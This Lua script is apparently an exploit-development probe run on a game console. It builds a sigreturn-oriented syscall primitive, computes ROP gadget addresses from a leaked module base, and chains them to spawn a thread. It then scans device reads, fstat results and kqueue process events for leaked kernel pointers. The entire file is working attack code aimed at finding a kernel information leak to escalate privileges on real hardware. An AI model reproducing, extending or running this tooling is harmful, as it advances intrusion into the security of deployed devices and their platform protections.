-- CRASH_CLASS: LOW
-- PROBE 142x2: Safe device reads (O_NONBLOCK) + fstat scan + EVFILT_PROC
-- Avoids sbl_srv/encdec/dbggc which may have crashed 142x.

print("=== PROBE 142x2 ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_kevent = make_syscall(363)
local sc_kqueue = make_syscall(362)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local einfo = memory.alloc(0x200)
wd(einfo, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(einfo)) end)
local elo = safe_rd(einfo + 0x108) or 0
local ehi = safe_rd(einfo + 0x10C) or 0
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))

local function make_path(base, path)
    for ci = 0, #path - 1 do
        local off = ci
        local addr = base + off - (off % 4)
        local cur = safe_rd(addr) or 0
        local shift = (off % 4) * 8
        cur = cur - (math.floor(cur / 2^shift) % 256) * 2^shift
            + string.byte(path, ci + 1) * 2^shift
        wd(addr, cur)
    end
    local toff = #path
    local taddr = base + toff - (toff % 4)
    local tcur = safe_rd(taddr) or 0
    local tshift = (toff % 4) * 8
    tcur = tcur - (math.floor(tcur / 2^tshift) % 256) * 2^tshift
    wd(taddr, tcur)
end

--------------------------------------------------------------------
-- [A] Safe non-blocking reads (known-safe devices only)
--------------------------------------------------------------------
print("")
print("--- [A] Device reads ---")

local safe_devs = {
    "/dev/notification0", "/dev/notification1",
    "/dev/dipsw", "/dev/rng", "/dev/duid",
    "/dev/hid", "/dev/camera", "/dev/dce",
    "/dev/gc", "/dev/acm", "/dev/gic"
}
local path_buf = gpu + 0x1000
local rbuf = gpu + 0x2000

for _, path in ipairs(safe_devs) do
    make_path(path_buf, path)
    local rv = srop(5, ua(path_buf), uint64(6))  -- O_RDWR|O_NONBLOCK
    local rh, rl = get_hi_lo(rv)
    if rl >= 256 or rh ~= 0 then
        rv = srop(5, ua(path_buf), uint64(4))  -- O_RDONLY|O_NONBLOCK
        rh, rl = get_hi_lo(rv)
    end
    if rl < 256 and rh == 0 then
        local fd = rl
        for off = 0, 0xFF, 4 do wd(rbuf + off, 0) end
        local rv_r = srop(3, uint64(fd), ua(rbuf), uint64(256))
        local rrh, rrl = get_hi_lo(rv_r)
        if rrl > 0 and rrl < 0x10000 then
            print("[A] " .. path .. " fd=" .. fd .. " read=" .. rrl .. " DATA!")
            for off = 0, math.min(rrl - 1, 63), 4 do
                local v = safe_rd(rbuf + off)
                if v and v ~= 0 then
                    print("[A]  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
                end
            end
            for off = 0, math.min(rrl - 1, 63), 8 do
                local q = safe_rq(rbuf + off)
                if q then
                    local qh, ql = get_hi_lo(q)
                    if qh >= 0xFFFF8000 then
                        print("[A] *** KERNEL PTR " .. path .. "+" .. string.format("%02X", off) .. "! ***")
                    end
                end
            end
        else
            print("[A] " .. path .. " fd=" .. fd .. " read=" .. rrl)
        end
        srop(6, uint64(fd))
    end
end

--------------------------------------------------------------------
-- [B] fstat on existing fds (3-20), scan for kernel pointers
--------------------------------------------------------------------
print("")
print("--- [B] fstat scan ---")

local statbuf = gpu + 0x3000
for fd = 3, 20 do
    for off = 0, 0x8F, 4 do wd(statbuf + off, 0) end
    local rv_fs = srop(189, uint64(fd), ua(statbuf))
    local fsh, fsl = get_hi_lo(rv_fs)
    if fsl == 0 and fsh == 0 then
        for off = 0, 0x88, 8 do
            local q = safe_rq(statbuf + off)
            if q then
                local qh, ql = get_hi_lo(q)
                if qh >= 0xFFFF8000 then
                    print("[B] *** KERNEL fd=" .. fd .. " +" .. string.format("%02X", off) .. "=" .. hex(q))
                end
            end
        end
        local mode = safe_rd(statbuf + 0x10) or 0
        local size = safe_rq(statbuf + 0x48)
        print("[B] fd=" .. fd .. " mode=0" .. string.format("%o", mode) .. " size=" .. hex(size))
    end
end

--------------------------------------------------------------------
-- [C] Dedicated EVFILT_PROC kqueue + thread exit
--------------------------------------------------------------------
print("")
print("--- [C] EVFILT_PROC ---")

local _, kq = pcall(function() return sc_kqueue() end)
local kqh, kql = get_hi_lo(kq)
print("[C] kq=" .. kql)

if kql < 256 and kqh == 0 then
    local kev = gpu + 0x5000
    wq(kev + 0x00, uint64(pid))
    wd(kev + 0x08, 0x0001FFFB)  -- EVFILT_PROC, EV_ADD
    wd(kev + 0x0C, 0xE0000001)  -- NOTE_EXIT|NOTE_FORK|NOTE_EXEC|NOTE_TRACK
    wq(kev + 0x10, uint64(0))
    wq(kev + 0x18, uint64(0x50523043))

    local ts0 = gpu + 0x5100
    wq(ts0, uint64(0))
    wq(ts0 + 8, uint64(0))

    local _, rv_reg = pcall(function()
        return sc_kevent(uint64(kql), uint64(kev), uint64(1),
                         uint64(0), uint64(0), uint64(ts0))
    end)
    print("[C] reg=" .. hex(rv_reg))

    -- Spawn short-lived thread
    local rop = gpu + 0x10000
    local i = 0
    wq(rop + i, g_pop_rdi); i=i+8
    wq(rop + i, uint64(0)); i=i+8
    wq(rop + i, g_pop_rax); i=i+8
    wq(rop + i, uint64(431)); i=i+8
    wq(rop + i, sc_addr); i=i+8

    local tctx = gpu + 0x20000
    for off = 0, 0x4FF, 4 do wd(tctx + off, 0) end
    pcall(function() return sc_gc(uint64(tctx)) end)
    wq(tctx + 0xE0, g_ret)
    wq(tctx + 0xF8, ua(rop))

    local tid_p = gpu + 0x30000
    wq(tid_p, uint64(0))
    pcall(function()
        return sc_thr_create(uint64(tctx), uint64(tid_p), uint64(0))
    end)
    local t_val = safe_rq(tid_p)
    local th, tl = get_hi_lo(t_val)
    print("[C] thread=" .. tl)

    -- Wait 100ms
    local ts100 = memory.alloc(16)
    wq(ts100, uint64(0))
    wq(ts100 + 8, uint64(100000000))
    pcall(function() sc_nanosleep(uint64(ts100), uint64(0)) end)

    -- Poll for events
    local kev_out = gpu + 0x6000
    for off = 0, 0x7F, 4 do wd(kev_out + off, 0xEE) end

    local _, rv_poll = pcall(function()
        return sc_kevent(uint64(kql), uint64(0), uint64(0),
                         uint64(kev_out), uint64(4), uint64(ts0))
    end)
    local ph, pl = get_hi_lo(rv_poll)
    print("[C] poll=" .. pl)

    if pl > 0 then
        for ev = 0, math.min(pl - 1, 3) do
            local base = kev_out + ev * 0x20
            local ident = safe_rq(base)
            local ff = safe_rd(base + 0x08)
            local ffl = safe_rd(base + 0x0C)
            local data = safe_rq(base + 0x10)
            local udata = safe_rq(base + 0x18)
            print("[C] ev" .. ev .. ": ident=" .. hex(ident) ..
                  " ff=0x" .. string.format("%08X", ff or 0) ..
                  " ffl=0x" .. string.format("%08X", ffl or 0))
            print("[C] ev" .. ev .. ": data=" .. hex(data) .. " udata=" .. hex(udata))
            if data then
                local dh, dl = get_hi_lo(data)
                if dh >= 0xFFFF8000 then
                    print("[C] *** KERNEL PTR IN PROC EVENT DATA! ***")
                end
            end
        end
    else
        print("[C] no events (thread exit not reported by EVFILT_PROC)")
    end

    srop(6, uint64(kql))
end

print("")
print("=== DONE ===")
